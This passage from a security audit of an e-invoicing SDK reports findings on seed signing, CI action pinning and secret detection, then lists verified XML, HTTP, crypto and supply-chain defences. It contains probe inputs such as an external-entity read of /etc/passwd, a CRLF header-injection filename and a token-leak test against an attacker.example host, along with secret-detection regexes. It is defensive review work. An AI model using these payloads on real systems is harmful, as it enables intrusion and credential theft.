back as literal `&e;` text or raise, and the signed fixtures must still pass the XMLDSig gate
(`uv run --with xmlsec python scripts/verify_signing.py`) — that gate is the only thing that proves the
canonicalization did not move.

---

### F-SEC-10 — The seed is signed without shape or size validation (LOW)

**CWE-501 (Trust Boundary Violation) / CWE-345 / OWASP A04.** Both packages. TS: verified by running.

**Where.** `client.ts:321,340-341` (and `client.py:296-311`) take the raw seed body, hand it to
`Signature.signXml(seed, 'SemillaModel')` / `sign_xml(seed, 'SemillaModel')`, and POST the signed result back
to the same host. Nothing checks that the body is a `SemillaModel` document, that it has no DOCTYPE, that it
is a single element, or that it is below any size — and `rootElName` **overrides** the parsed root
(`signing.ts:76-77`, `signing.py:143-145` drives the reference XPath by name).

Verified by running (ephemeral in-test key, nothing committed):

```ts
signXml('<Foo xmlns="urn:whatever"><SemillaModel><Evil>attacker chosen content</Evil></SemillaModel></Foo>', 'SemillaModel')
// ok: true, root: Foo, contains attacker content: true
// xml-crypto warns: XML_CRYPTO_EMPTY_URI_NOT_DOCUMENT_ELEMENT — "the signature this produces does not verify"
```

**Attack scenario.** A caller who passes a `buyerHost` (F-SEC-02), or DGII being hostile/compromised, answers
the unauthenticated `GET …/semilla` with `<SemillaModel>` containing content of their choosing. The SDK signs
it with the issuer's private key and returns the signature to that host. The practical payoff is limited —
DGII only accepts a seed signature against the challenge it just issued, so a signature over attacker text is
not directly replayable — which is why this is LOW and not higher. The residual concerns are that the SDK
acts as a general signing oracle for any host the caller names, that it silently emits a **non-verifying**
signature when the root is not `SemillaModel` (proven by the xml-crypto deprecation warning above), and that
no size cap protects the signer's memory (F-SEC-08).

**Fix (both packages).** Before signing the seed: reject a body longer than a small cap (a few KiB), reject a
`<!DOCTYPE`/`<!ENTITY` (both packages already reject entities, but fail *loudly* and by name here), and
require `extractRootElementName(seed) === 'SemillaModel'` — otherwise `Err(VALIDATION, "Unexpected seed
document")`. Then sign **without** the `rootElName` override so the reference always targets the parsed
document element.

**How to verify the fix.** Unit tests: a seed body of `<Foo><SemillaModel/></Foo>` → `Err(VALIDATION)`;
a seed body with a DOCTYPE → `Err`; a normal `SemillaModel` fixture → unchanged signature that still passes
the XMLDSig gate.

---

### F-SEC-11 — CI actions pinned to movable tags; unpinned tool fetches at publish time (LOW)

**CWE-1357 (Reliance on Insufficiently Trustworthy Component) / OWASP A08.** Verified by reading.

**Where.** Every one of the eleven distinct `uses:` entries is a major-version tag, none a commit SHA:
`actions/checkout@v7`, `actions/cache@v6`, `actions/setup-node@v7`, `actions/configure-pages@v6`,
`actions/upload-pages-artifact@v5`, `actions/deploy-pages@v5`, `astral-sh/setup-uv@v7`,
`oven-sh/setup-bun@v2`, `jdx/mise-action@v5`, `googleapis/release-please-action@v5`,
`crazy-max/ghaction-github-labeler@v6` (`.github/workflows/*.yml`). Additionally:
`docs.yml:36` runs `uvx --from mkdocs --with mkdocs-material …` with **no version pin**, and
`typescript.yml:92` runs `npm install -g npm@^11.5.1` — two network fetches of unpinned, unhashed packages in
workflows that hold `id-token: write` / publish credentials.

**Attack scenario.** A compromised or malicious upstream tag (or an npm/MkDocs package takeover) runs
arbitrary code in a job that can mint an OIDC token for `npm publish`/`uv publish` (`typescript.yml:72-74,101`,
`python.yml:67-69,84`) or that can rewrite the docs site. The `id-token: write` jobs are the crown jewels: a
compromised action there publishes attacker code to every integrator. Nobody in the repo reviews the SHA
because the SHA is not written down.

**Fix.** Pin all third-party actions to full commit SHAs with the tag in a trailing comment (Dependabot
already updates the `github-actions` ecosystem — `dependabot.yml:35-45` — and preserves SHA pins), pin
`mkdocs`/`mkdocs-material` and `npm` to exact versions, and consider moving the `id-token: write` step to the
smallest possible job with no third-party action in it. While in these files, add a workflow-level
`permissions: contents: read` to `python.yml` and `typescript.yml` so the `ci` jobs' token scope is stated
rather than inherited from the repository default (the publish jobs already narrow their own).

**How to verify the fix.** A lint step over `.github/workflows/*.yml` asserting every `uses:` matches
`@[0-9a-f]{40}$`, and `grep` proving no unpinned `uvx`/`npm install -g` remains.

---

### F-SEC-12 — Secret-detection coverage is narrower than the hooks imply (LOW)

**CWE-778 (Insufficient Logging) / OWASP A09** — detective-control gap, no secret is currently committed.
Verified by running.

**Where.** `.pre-commit-config.yaml:90-94` defines `certificate-material` as an extension matcher
(`\.(p12|pfx|pem|jks|jceks|keystore|der|p8)$`) with `language: fail`; `.gitleaks.toml:1-11` extends the
default ruleset with one allowlist entry. `mise.toml:10` pins gitleaks 8.30.1.

Measured:
- `gitleaks dir .` on the repo → **no leaks** (13.1 MB, 9.4 s).
- `gitleaks git .` → **no leaks** across 150 commits.
- `git log --all --diff-filter=A` filtered for `p12|pfx|pem|key|jks|crt|der|p8` → **nothing ever added**.
- A PEM-formatted private key in a scratch repo **is** detected.
- A **base64-encoded PKCS#12 blob** — the exact shape of the `DGII_P12_BASE64` secret used in
  `integration.yml:33,74,120` — is **not** detected.
- The `certificate-material` hook's extension list omits `.key`, `.crt`, `.b64`, `.txt`, and extensionless
  files, so `identity.key` or `cert.b64` would pass that hook (gitleaks only rescues the PEM-shaped cases).

**Attack scenario.** A contributor pastes `base64 -w0 identity.p12` into a fixture, an example, a
`docker-compose.yml`, or a test vector, and both gates stay green. The material is now in git history and in
every clone — and, with the private key, in every `node_modules`-free copy of the repo. `.gitignore`
(`.gitignore:186-192`) covers `*.p12`/`*.pem`/`*.key` but not the renamed or encoded forms.

**Fix.** Add explicit gitleaks rules for PKCS#12 magic in base64 (`MII` + long base64 run, or the DER magic
`30 82` in hex/base64) and for the `DGII_P12_BASE64`/`DGII_P12_PASSWORD` names; extend the
`certificate-material` regex to
`\.(p12|pfx|pem|key|crt|csr|jks|jceks|keystore|der|p8|b64)$`; and add
`password|passphrase|secret` value-shape rules scoped to `docs/`, `examples/`, and test fixtures.

**How to verify the fix.** Re-run the scratch-directory probe (a base64 `.b64` blob and an extensionless
DER file) and require gitleaks to fail on both; run `gitleaks dir . && gitleaks git .` on the repo to confirm
no false positives were introduced.

---

## What is already correct

These are defences that hold, verified rather than assumed. They matter as much as the gaps.

### XML parsing (the highest-priority question in this review)

- **C1 — TypeScript has no XXE surface at all, by construction.** `@xmldom/xmldom` 0.8.15 has no DTD/entity
  machinery. Measured: `<!ENTITY e "EXPANDED">` + `&e;` leaves the **literal text** `"&e;"` in
  `textContent` **and** reports a parse error; an external `SYSTEM "file:///…"` entity behaves the same; a
  bare `&nope;` reports an error; only the five predefined entities expand (`&amp;&lt;` → `"&<"`). Because
  `parseStrict` collects every reported error and throws (`signing.ts:27-36`), a document carrying a DTD or
  an unknown entity is rejected as `INVALID_XML` **before** anything is signed. `xml-js` (sax) is stricter
  still: it **throws** `Invalid character entity` on any non-predefined entity, which
  `Transformer.xml2json` turns into `Err(INVALID_XML)` (`transformer.ts:134-146`). Net: no external entity
  resolution, no DTD, no billion laughs, no XInclude — there is no code path that could reach a file or the
  network from a document.
- **C2 — Python does not resolve external entities.** Measured on lxml 6.1.3 / libxml2 2.14.6, including the
  most permissive configuration: `<!ENTITY x SYSTEM "file:///etc/passwd">` fails with
  `Entity 'x' not defined`, even with `load_dtd=True`. lxml's `no_network=True` / `load_dtd=False` defaults
  hold for every parse site (`signing.py:115`, `signing.py:52`, `transformer.py:103`, `validation.py:108`).
  **There is no file-disclosure or SSRF primitive in the Python parse paths.**
- **C3 — Entity-expansion and depth bombs are bounded.** Nine-level billion laughs is refused by libxml2's
  amplification guard; 50 000-deep nesting is refused at depth 256 (`Excessive depth in document`); the same
  input through `@xmldom/xmldom`/`xml-js` parses in ~250–290 ms because both are linear, so the only limit
  there is memory. Residual fragility is F-SEC-09.
- **C4 — The hand-written extraction regexes are not ReDoS-able.** `_ATTRIBUTE_SPAN`
  (`xml.ts:17`, `_xml.py:18`) mixes `[^>"']`, `"[^"]*"` and `'[^']*'`, which are *disjoint* per input
  position, so there is no exponential backtracking: 128 000 unterminated quotes take 23.8 ms in Python
  (linear), and the TS pattern is byte-identical. Using regex extraction instead of a parser for routing and
  idempotency keys is a design trade-off, but it is not a denial-of-service trade-off.
- **C5 — Schema validation cannot be tricked into running a user-chosen binary path from data.** The
  `xmllint` schema path is resolved from a fixed map (`validation.ts:41-70,138`) — never from the
  document — the arguments are passed as an argv array with no shell (`validation.ts:139-143`), and the XML
  goes in over stdin. `DGII_XMLLINT_BIN` can point at any binary, but controlling the process environment is
  already code execution, so this is not a finding.

### HTTP and transport

- **C6 — TLS verification is on in both packages, by default, with no override in the code.**
  `httpx2.Client` defaults are `verify=True`, `follow_redirects=False`, `max_redirects=20` (measured by
  introspecting the signature; `http.py:119-120` constructs the client without changing them). TypeScript
  uses the platform `fetch` with no `agent`/`dispatcher` override, which verifies against the OS trust store.
- **C7 — `Authorization` is not forwarded across a redirect**, even in the TS path that follows them
  (F-SEC-05): both undici and bun strip confidential headers on cross-origin redirects (measured, all five
  3xx codes). That is why F-SEC-05 is about body replay and response spoofing, not token theft.
- **C8 — Multipart framing cannot be injected.** A filename of
  `f.xml"\r\nX-Injected: pwned\r\n\r\n<body>` is percent-encoded by both runtimes and by httpx2 before it
  reaches the `Content-Disposition` header (`filename="f.xml%22%0D%0AX-Injected…"`), and `Content-Length` is
  computed by the client, never by the SDK (`http.ts:325-330`, `http.py:288-295`). Measured on node 26,
  bun 1.4.4 and httpx2 2.16.0. No request-smuggling or header-injection primitive.
- **C9 — The retry predicate cannot re-send a rejected e-CF.** Only 408/429/500/502/503/504 plus transport
  errors are retryable (`errors.ts:14`, `errors.py:16`), and
  `isRetryableError` matches on error *class names*, not on the wording of a server message
  (`resilience.ts:47-72`). A 4xx rejection terminates the call.
- **C10 — No temp files, no key material written to disk.** Neither package creates a temp file; nothing
  serialises the private key anywhere except into the document's own `<X509Certificate>` (the certificate
  only, `signing.ts:102`, `signing.py:182-184`), which is public by definition.

### Error normalization and data exposure

- **C11 — The error normalizer is bounded and shape-limited.** Messages are truncated to 1000 characters
  (`errors.ts:33-36`, `errors.py:54-55`), whitespace-collapsed, HTML-stripped with `<script>`/`<style>`
  removed (`errors.ts:44-54`, `errors.py:60-65`), and the JSON walker is cycle-safe in TS via an explicit
  `WeakSet` (`errors.ts:96-101`). This is the right shape for a boundary that consumes DGII's inconsistent
  HTML/ProblemDetails/string payloads: nothing unbounded reaches a log through the *message* channel. The raw
  body is still kept in `DgiiError.data` (by design, for reconciliation) — that is the only unbounded field,
  and it is caller-visible rather than printed.
- **C12 — No token or key appears in any URL, error message, or log line the SDK writes.** Tokens travel only
  in headers (`http.ts:197-199`, `http.py:148-152`); `DgiiError` carries `resource`, `method` and `baseURL`
  but never the `Authorization` value or the `statusApiKey`. The SDK itself never logs anything (no
  `console.*` in `src/`, no `print` in the package). The CLI's `authenticate` command *does* print the token
  (`cli.py:95`) — deliberate, documented behaviour of a diagnostic command, and it is the operator's own
  terminal.

### Crypto

- **C13 — Signing is narrowly scoped and canonicalization is pinned.** Inclusive C14N 1.0 + RSA-SHA256 with
  explicit algorithm URIs in both packages (`signing.ts:9-12,99-104`, `signing.py:33-38,146-160`), the
  reference XPath built from an *element name*, never from caller-supplied XPath (`signing.ts:113-118`,
  `signing.py:146-160`), and no way for a caller to inject a transform, digest or key. Comments are
  stripped before canonicalization (`signing.ts:50-67` called at `signing.ts:120`, `signing.py:115`), which removes a classic
  signature-wrapping variation.
- **C14 — Money never becomes a float, so a rounded digest cannot be used as an integrity oracle.**
  `compareDecimal` / `compare_decimal` do string comparison (`reception.ts:64-98`, `reception.py:52-77`) and
  `roundHalfUpToCents` / `_round_monetary` never pass through `number`/`float`
  (`transformer.ts:30-48`, `transformer.py:28-41`). Amounts therefore cannot be made to disagree between the
  signed document and the routing decision — the property that keeps reception routing (§AGENTS.md) honest.
- **C15 — Idempotency *is* persisted before transmit, on both sides.** The marker is written before `send()`
  (`client.ts:252`, `client.py:287`), single-flighted in TS (`client.ts:263-279`), and the key includes
  `SHA-256(signedXml)`, so two documents that share an RNC + e-NCF cannot alias (`client.ts:215-232`,
  `client.py:222-240`). The Python marker lifecycle is correct end-to-end (F-SEC-01 is a TS regression from
  it).

### Supply chain and repository hygiene

- **C16 — Publishing uses OIDC trusted publishing; there is no long-lived registry credential.**
  `python.yml:67-69,84` (`id-token: write`, no `PYPI_TOKEN`, `uv publish`) and `typescript.yml:72-74,101`
  (`id-token: write`, no `NPM_TOKEN`, `npm publish --access public`). Nothing in the repository can exfiltrate
  a publish token, because none exists.
- **C17 — The workflows that can publish or write declare minimal permissions, and the ones that do not are
  read-only by behaviour.** `pre-commit.yml:13-14`, `integration.yml:16-17`, `labels.yml:10`,
  `docs.yml:17-20` (only `pages: write` + `id-token: write` for Pages) and both publish jobs
  (`python.yml:67-69`, `typescript.yml:72-74`) declare exactly what they need — `id-token: write` and nothing
  else. `release-please.yml:8-13` is the only workflow with `contents: write`, and it needs it.
  `python.yml` and `typescript.yml` declare no workflow-level block, so their `ci` jobs inherit the repository
  default — a gap only in the sense that the guarantee is implicit rather than written down; it is carried as
  part of F-SEC-11 rather than as its own finding.
- **C18 — No `pull_request_target` anywhere.** All PR-triggered workflows use `pull_request`
  (`pre-commit.yml:6`, `python.yml:7`, `typescript.yml:7`, `docs.yml:10`), so fork PRs never run with
  repository secrets. The integration suite — the only one that touches real DGII — is `workflow_dispatch`
  only (`integration.yml:8-17`), and it gates on `detect-credentials` before doing anything.
- **C19 — The CI-held `.p12` is handled with care.** `integration.yml:69,84,115,130` decodes into
  `$RUNNER_TEMP`, `chmod 600`s it, and `shred -u`s it under `if: always()`. The password is passed as an env
  var (see Needs follow-up) but never echoed.
- **C20 — Lockfiles are present, enforced, and checked.** `uv lock --check` runs *before* `uv sync --frozen`
  (`python.yml:33-40`); the TS side uses `bun install --frozen-lockfile` everywhere
  (`typescript.yml:33`, `pre-commit.yml:39`); the pre-commit hooks all use `uv run --frozen`; release-please
  owns both `.value` files. Nothing about the dependency graph can drift silently.
- **C21 — No secret material has ever been committed.** 150 commits scanned by `gitleaks git`: clean;
  `gitleaks dir`: clean; no `.p12`/`.pem`/`.key`/`.jks` ever added per `git log --diff-filter=A`.
- **C22 — The schemas are vendored, not fetched.** `validateDocument`/`validate_document` resolve names
  through a fixed map to bundled files; no remote schema is ever loaded from a document via
  `xsi:schemaLocation` (`validation.ts:41-70`, `validation.py:22-58`), so schema-validation cannot be turned
  into an SSRF.

---

## Coverage

### Checked, with evidence

| Area | How |
|---|---|
| XXE / external entities / DTD in **TS signing** | ran 4 crafted documents through `DOMParser` (xmldom 0.8.15) |
| XXE / DTD / entity expansion in **TS transformer** | ran 3 crafted documents through `xml-js` |
| XXE / entity expansion / depth / timing in **Python** | ran 12 probes against lxml 6.1.3 (default, `load_dtd=True`, `resolve_entities=False`), through `Transformer.xml_to_json`, `validate_document`, and `etree.fromstring` directly |
| ReDoS in the extraction regexes | ran 128 k-quote inputs in both regex dialects |
| Redirect behaviour, `Authorization` forwarding, body replay | ran a local origin + 5 local redirectors (301/302/303/307/308) under node 26.13.0 **and** bun 1.4.4 |
| `httpx2` transport defaults | introspected `Client.__init__` signature; confirmed `follow_redirects=False`, `verify=True`, `trust_env=True` |
| Proxy-env behaviour | ran a local HTTP proxy: node fetch ignores `HTTP_PROXY`, bun honours it, httpx2 honours it (`trust_env=True`) |
| Multipart filename / `Content-Length` injection | captured raw bytes from node, bun and httpx2 with a hostile filename |
| Secret exposure via inspection | ran `util.inspect` / `JSON.stringify` / `repr` / `vars` on `P12Reader`, `Signature`, `ECF`, `P12ReaderData`, `AuthToken`; also proved `#private` + `[util.inspect.custom]` fixes it in node and bun |
| `validateXMLCertificate` semantics | ran it on an unsigned document carrying a self-signed cert |
| Idempotency marker lifecycle on an empty 2xx | ran the TS client with an injected transport (2 requests observed) and the Python client with an injected `send` (1 request observed) |
| `buyerHost` token attachment | ran the TS client with an injected transport and `buyerHost = "http://attacker.example/"` |
| Seed signing / root-name override | ran `signXml` with a foreign root and a nested `SemillaModel` |
| CLI passphrase handling | ran `py-dgii-ecf sign --help` and a real invocation with `--password` |
| Terminal escape propagation | ran the normalizer in both packages with OSC/CSI payloads |
| Secret scanning | ran `gitleaks dir .` and `gitleaks git .` on the repo; ran gitleaks on a scratch dir containing a base64 PKCS#12 and a PEM key |
| Committed key material | `git log --all --diff-filter=A --name-only` filtered for key/cert extensions |
| CI posture | read all seven workflows, `dependabot.yml`, `.pre-commit-config.yaml`, `.gitleaks.toml`, both lockfiles, both manifests |
| Dependency versions | read `bun.lock` (xmldom 0.8.15, xml-crypto 6.4.0, node-forge 1.4.2, xml-js 1.6.11/sax) and `uv.lock` (lxml 6.1.3, cryptography 50.0.2, httpx2 2.16.0, typer 0.27.3) |

### Not checked (state it, don't hide it)

- **No traffic to DGII**, by rule. Every dynamic test used a local stub. The DGII server's real header,
  redirect and error-body behaviour is inferred from the code paths and the Python package's own comments,
  not from observation.
- **No advisory-database / CVE sweep.** No offline npm/PyPI advisory source was available in this sandbox,
  so I read the *resolved* versions from the lockfiles and reasoned about ranges, but I did not confirm
  whether any specific CVE affects `xml-crypto 6.4.0`, `node-forge 1.4.2`, `@xmldom/xmldom 0.8.15`,
  `xml-js 1.6.11`/`sax` or `lxml 6.1.3`. **This is the biggest hole in my coverage** and it is the first
  item under Needs follow-up.
- **No fuzzing.** I probed the specific attack classes in the brief by hand; I did not run a coverage-guided
  fuzzer over `xml2json`, `extractElementText` or the error normalizer.
- **No review of the bundled XSDs' own content** (entity references, `xs:include` paths) — the three copies
  are treated as trusted repository content per AGENTS.md, and they are byte-identical by construction.
- **No review of the dependency *implementations*' internals** (e.g. how `cockatiel` composes policies, how
  `forge.pkcs12` handles padding oracles). I reviewed how they are *used*.
- **No binary/tooling verification**: `xmlsec1` is not installed in this sandbox, so I could not re-run the
  XMLDSig gate; I accepted the baseline as given.
- **Docs-site and example projects**: I checked that `docs.yml` deploys only the site and reviewed its
  action pins, but did not audit `examples/` for secret handling beyond `git ls-files`.
- **Secrets & credential hygiene as a discipline** (rotation, storage, `.env` handling) is pipeline **P6**'s
  remit; I covered only the SDK-side and tooling-side mechanics and flag the overlap for the P6 owner.
- **Client-side/bundler usage.** `SECURITY.md` says "server-side only, do not bundle in a browser", and the
  package ships no browser field, but I did not verify what a bundler actually does with `node:crypto` /
  `node:fs` imports. If a caller does bundle it, A1 is exposed to the page — out of scope here, worth a
  follow-up.

### On the interaction between P5 and P6

F-SEC-03, F-SEC-06 and F-SEC-12 are secret-handling mechanics that overlap P6. I am reporting them because
they are attack surface *inside* the shipped code (an object that leaks when logged is a security property of
the API, not only a hygiene practice). If P6 reaches a different conclusion on any of the three, the P5
verdict does not change: F-SEC-01 (HIGH) is independent of secret handling.

---

## Needs follow-up

Ordered by risk reduced per unit of effort.

1. **F-SEC-01, TypeScript only — fix before the next TS release.** Nine lines, mirrors code that already
   exists in `client.py:241-262`, and closes a duplicate-fiscal-document path. Add the same test to both
   suites so the parity gate pins it.
2. **Dependency CVE sweep (blocking for the release decision, not for this report).** Run
   `bun audit` / `npm audit --omit=dev` and `uv run pip-audit` (or `osv-scanner`) against both lockfiles, and
   put the command in `mise run` so it is repeatable. I could not do this offline; the versions in the
   lockfiles need to be checked against advisories for `xml-crypto`, `@xmldom/xmldom`, `node-forge`,
   `xml-js`/`sax`, `lxml`, `cryptography` and `httpx2`. If any advisory lands, it becomes the top finding.
3. **F-SEC-02 + F-SEC-05 together** — they are the same trust boundary (`buyerHost`/redirect) seen from two
   directions, and one design decision (scope the token to an origin; refuse to follow redirects) closes
   both. Do this in one change in both packages, with the architecture doc updated in the same commit.
4. **F-SEC-03** — the `#private`-field change is mechanical and testable; it converts "developer must not log
   the client" into "logging the client is harmless". Pair it with the F-SEC-06 passphrase-lifetime change in
   the same PR, since both touch `P12Reader`/`Signature`.
5. **F-SEC-04** — either rename or add the real verifier. This one is a documentation/API-contract fix more
   than a code fix, and it is the finding most likely to be *misread as already handled* by a downstream
   integrator, so it deserves a line in `docs/{en,es}` and in `SECURITY.md`.
6. **F-SEC-09** — one parser factory in Python plus a `lxml` floor bump; re-run the XMLDSig gate afterwards,
   because it is the only check that would catch a canonicalization regression.
7. **F-SEC-07, F-SEC-08, F-SEC-10** — small, local, cheap. Strip control characters in the normalizer, cap
   the body, validate the seed shape. All three add tests that are trivial to write.
8. **F-SEC-11, F-SEC-12** — CI and tooling hardening. SHA-pin the actions (Dependabot will keep them
   current), pin the `uvx`/`npm` fetches, widen the two secret-detection rules. No runtime impact, so this can
   ride along with any other release.
9. **For the P6 owner.** `integration.yml:74,120` pass `DGII_P12_PASSWORD` through the job environment; a
   co-tenant or a compromised action on that runner can read it via `/proc`. Prefer a file + `--password-stdin`
   (which is also the F-SEC-06 fix), and consider a dedicated `environment:` with required reviewers for the
   integration workflow.
10. **For the architecture doc.** F-SEC-01, F-SEC-02 and F-SEC-05 all change, or clarify, a documented
    contract (idempotency lifecycle; `buyerHost` validation; redirect policy). `project-docs/architecture.md`
    must move in the same commit as the code, per AGENTS.md.
